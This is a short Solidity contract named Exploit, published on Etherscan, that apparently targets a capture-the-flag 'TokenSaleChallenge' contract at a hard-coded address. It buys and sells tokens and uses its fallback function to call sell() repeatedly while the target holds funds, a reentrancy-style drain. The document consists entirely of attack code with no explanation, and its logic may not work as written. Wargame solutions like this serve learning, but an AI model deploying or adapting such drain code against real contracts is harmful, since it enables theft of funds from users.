/**
 *Submitted for verification at Etherscan.io on 2021-10-07
*/

pragma solidity ^0.4.21;

interface TokenSaleChallenge {
    function buy(uint256 numTokens) external payable;
    function sell(uint256 numTokens) external;
}

contract Exploit {
    address constant target = 0xb3015440Ee3577F6A91a34C486671BAe77c07ab8;
    uint amount;

    function attack() external payable {
        amount = msg.value;
        TokenSaleChallenge(target).buy.value(amount)(amount);
        TokenSaleChallenge(target).sell(amount);
    }

    function () external payable {
        if (target.balance > amount) {
            TokenSaleChallenge(target).sell(amount);
        }
    }
}